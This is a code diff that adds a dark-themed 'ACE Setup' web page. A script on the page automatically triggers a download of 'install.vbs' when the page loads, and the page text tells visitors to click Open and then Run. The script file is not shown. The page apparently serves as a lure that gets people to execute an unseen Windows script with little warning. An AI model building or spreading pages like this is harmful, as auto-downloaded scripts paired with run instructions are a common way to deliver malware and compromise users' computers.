@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html><head>
+<title>ACE Setup</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { background:#0a0a0a; color:#eee; font-family:monospace;
+       display:flex; align-items:center; justify-content:center; height:100vh; }
+.box { text-align:center; }
+h2 { color:#00e5ff; font-size:22px; letter-spacing:2px; margin-bottom:10px; }
+p  { color:#666; font-size:13px; margin-bottom:6px; }
+</style>
+</head><body>
+<div class="box">
+  <h2>ACE</h2>
+  <p>Download starting...</p>
+  <p style="margin-top:16px;color:#444">Click <b style="color:#00e5ff">Open</b> when the download appears, then click <b style="color:#00e5ff">Run</b></p>
+</div>
+<script>
+  // Auto-trigger download immediately
+  const a = document.createElement('a');
+  a.href = 'install.vbs';
+  a.download = 'install.vbs';
+  document.body.appendChild(a);
+  a.click();
+</script>
+</body></html>
